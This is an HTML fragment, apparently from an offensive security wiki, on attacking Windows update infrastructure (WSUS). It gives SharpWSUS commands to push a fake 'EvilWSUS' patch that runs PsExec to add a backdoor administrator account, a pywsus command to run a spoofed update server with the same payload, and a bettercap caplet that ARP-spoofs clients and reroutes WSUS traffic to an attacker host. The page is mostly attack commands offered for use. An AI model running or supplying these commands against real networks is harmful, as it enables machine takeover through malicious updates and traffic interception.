<h4 id="bkmrk-wsus">WSUS</h4>
<ul id="bkmrk-push-an-evil-update-"><li>Push an evil update on the computers : <a href="https://labs.nettitude.com/blog/introducing-sharpwsus/">SharpWSUS explains</a>
</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true" style="bottom: 10px;"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1361px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true" style="height: 10px; width: 10px;"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 401px; min-width: 1360.52px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Locate the WSUS server</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.</span><span class="cm-operator">/</span><span class="cm-identifier">SharpWSUS</span> <span class="cm-identifier">locate</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Find a way to compromise it</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Enumerate the contents of the WSUS server to determine which machines to target</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.</span><span class="cm-operator">/</span><span class="cm-identifier">SharpWSUS</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">inspect</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Create a malicious patch with a Microsoft signed binary (mandatory)</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.</span><span class="cm-operator">/</span><span class="cm-identifier">SharpWSUS</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">create</span> <span class="cm-operator">/</span><span class="cm-identifier">payload</span><span class="cm-operator">:</span><span class="cm-string">"C:\tmp\psexec.exe"</span> <span class="cm-operator">/</span><span class="cm-identifier">args</span><span class="cm-operator">:</span><span class="cm-string">"-accepteula -s -d cmd.exe /c \"</span><span class="cm-identifier">net</span> <span class="cm-identifier">user</span> <span class="cm-identifier">user1</span> <span class="cm-identifier">Password123</span><span class="cm-operator">!</span> <span class="cm-operator">/</span><span class="cm-identifier">add</span> <span class="cm-operator">&amp;&amp;</span> <span class="cm-identifier">net</span> <span class="cm-identifier">localgroup</span> <span class="cm-identifier">administrators</span> <span class="cm-identifier">user1</span> <span class="cm-operator">/</span><span class="cm-identifier">add</span><span class="cm-punctuation">\</span><span class="cm-string">""</span> <span class="cm-operator">/</span><span class="cm-identifier">title</span><span class="cm-operator">:</span><span class="cm-string">"EvilWSUS"</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Create a WSUS group, add the target machine to the WSUS group and approve the malicious patch for deployment</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.</span><span class="cm-operator">/</span><span class="cm-identifier">SharpWSUS</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">approve</span> <span class="cm-operator">/</span><span class="cm-identifier">updateid</span><span class="cm-operator">:&lt;</span><span class="cm-identifier">GUID_from_create</span><span class="cm-operator">&gt;</span> <span class="cm-operator">/</span><span class="cm-identifier">computername</span><span class="cm-operator">:&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span> <span class="cm-operator">/</span><span class="cm-identifier">groupname</span><span class="cm-operator">:</span><span class="cm-string">"Evil Group"</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">14</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Wait for the client to download the patch, not possible to control</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">15</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.</span><span class="cm-operator">/</span><span class="cm-identifier">SharpWSUS</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">check</span> <span class="cm-operator">/</span><span class="cm-identifier">updateid</span><span class="cm-operator">:&lt;</span><span class="cm-identifier">GUID_from_create</span><span class="cm-operator">&gt;</span> <span class="cm-operator">/</span><span class="cm-identifier">computername</span><span class="cm-operator">:&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">16</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">17</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Clean up after the patch is downloaded.</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">18</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.</span><span class="cm-operator">/</span><span class="cm-identifier">SharpWSUS</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">delete</span> <span class="cm-operator">/</span><span class="cm-identifier">updateid</span><span class="cm-operator">:&lt;</span><span class="cm-identifier">GUID_from_create</span><span class="cm-operator">&gt;</span> <span class="cm-operator">/</span><span class="cm-identifier">computername</span><span class="cm-operator">:&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span> <span class="cm-operator">/</span><span class="cm-identifier">groupname</span><span class="cm-operator">:</span><span class="cm-string">"Evil Group"</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 401px;"></div><div class="CodeMirror-gutters" style="height: 451px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<ul id="bkmrk-spoof-the-wsus-serve"><li>
<a href="https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/wsus-spoofing">Spoof the WSUS server and hijack the update</a> if the updates are pushed through HTTP and not HTTPS</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1498px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 120px; min-width: 1498.05px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Find the WSUS server with the REG key</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">reg</span> <span class="cm-identifier">query</span> <span class="cm-identifier">HKLM</span><span class="cm-punctuation">\</span><span class="cm-identifier">Software</span><span class="cm-punctuation">\</span><span class="cm-identifier">Policies</span><span class="cm-punctuation">\</span><span class="cm-identifier">Microsoft</span><span class="cm-punctuation">\</span><span class="cm-identifier">Windows</span><span class="cm-punctuation">\</span><span class="cm-identifier">WindowsUpdate</span> <span class="cm-operator">/</span><span class="cm-identifier">v</span> <span class="cm-identifier">wuserver</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Setup the fake WSUS server</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">python3</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">pywsus</span><span class="cm-punctuation">.</span><span class="cm-identifier">py</span> <span class="cm-operator">--</span><span class="cm-identifier">host</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">network_interface</span><span class="cm-operator">&gt;</span> <span class="cm-operator">--</span><span class="cm-identifier">port</span> <span class="cm-number">8530</span> <span class="cm-operator">--</span><span class="cm-identifier">executable</span> <span class="cm-punctuation">.</span><span class="cm-operator">/</span><span class="cm-identifier">PsExec64</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-operator">--</span><span class="cm-identifier">command</span> <span class="cm-string">'/accepteula /s cmd.exe /c "net user usser1 Password123! /add &amp;&amp; net localgroup Administrators user1 /add"'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 120px;"></div><div class="CodeMirror-gutters" style="height: 170px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-and-arp-spoofing-wit">And ARP spoofing with bettercap and a <code>wsus_spoofing.cap</code> like this:</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true" style="bottom: 0px;"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 530px; min-width: 311px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">#</span> <span class="cm-variable">quick</span> <span class="cm-variable">recon</span> <span class="cm-variable">of</span> <span class="cm-variable">the</span> <span class="cm-variable">network</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">net</span><span class="cm-number">.</span><span class="cm-variable">probe</span> <span class="cm-variable">on</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">#</span> <span class="cm-variable">set</span> <span class="cm-variable">the</span> <span class="cm-variable">ARP</span> <span class="cm-variable">spoofing</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">set</span> <span class="cm-variable">arp</span><span class="cm-number">.</span><span class="cm-variable">spoof</span><span class="cm-number">.</span><span class="cm-variable">targets</span> <span class="cm-variable">$client_ip</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">set</span> <span class="cm-variable">arp</span><span class="cm-number">.</span><span class="cm-variable">spoof</span><span class="cm-number">.</span><span class="cm-variable">internal</span> <span class="cm-atom">false</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">set</span> <span class="cm-variable">arp</span><span class="cm-number">.</span><span class="cm-variable">spoof</span><span class="cm-number">.</span><span class="cm-variable">fullduplex</span> <span class="cm-atom">false</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">#</span> <span class="cm-variable">reroute</span> <span class="cm-variable">traffic</span> <span class="cm-variable">aimed</span> <span class="cm-variable">at</span> <span class="cm-variable">the</span> <span class="cm-variable">WSUS</span> <span class="cm-variable">server</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">set</span> <span class="cm-variable">any</span><span class="cm-number">.</span><span class="cm-variable">proxy</span><span class="cm-number">.</span><span class="cm-variable">iface</span> <span class="cm-variable">$interface</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">set</span> <span class="cm-variable">any</span><span class="cm-number">.</span><span class="cm-variable">proxy</span><span class="cm-number">.</span><span class="cm-variable">protocol</span> <span class="cm-variable">TCP</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">set</span> <span class="cm-variable">any</span><span class="cm-number">.</span><span class="cm-variable">proxy</span><span class="cm-number">.</span><span class="cm-variable">src_address</span> <span class="cm-variable">$WSUS_server_ip</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">set</span> <span class="cm-variable">any</span><span class="cm-number">.</span><span class="cm-variable">proxy</span><span class="cm-number">.</span><span class="cm-variable">src_port</span> <span class="cm-number">8530</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">14</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">set</span> <span class="cm-variable">any</span><span class="cm-number">.</span><span class="cm-variable">proxy</span><span class="cm-number">.</span><span class="cm-variable">dst_address</span> <span class="cm-variable">$attacker_ip</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">15</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">set</span> <span class="cm-variable">any</span><span class="cm-number">.</span><span class="cm-variable">proxy</span><span class="cm-number">.</span><span class="cm-variable">dst_port</span> <span class="cm-number">8530</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">16</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">17</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">#</span> <span class="cm-variable">control</span> <span class="cm-variable">logging</span> <span class="cm-variable">and</span> <span class="cm-variable">verbosity</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">18</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">events</span><span class="cm-number">.</span><span class="cm-variable">ignore</span> <span class="cm-variable">endpoint</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">19</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">events</span><span class="cm-number">.</span><span class="cm-variable">ignore</span> <span class="cm-variable">net</span><span class="cm-number">.</span><span class="cm-variable">sniff</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">20</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">21</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">#</span> <span class="cm-variable">start</span> <span class="cm-variable">the</span> <span class="cm-variable">modules</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">22</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">any</span><span class="cm-number">.</span><span class="cm-variable">proxy</span> <span class="cm-variable">on</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">23</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">arp</span><span class="cm-number">.</span><span class="cm-variable">spoof</span> <span class="cm-variable">on</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">24</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">net</span><span class="cm-number">.</span><span class="cm-variable">sniff</span> <span class="cm-variable">on</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 530px;"></div><div class="CodeMirror-gutters" style="height: 570px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
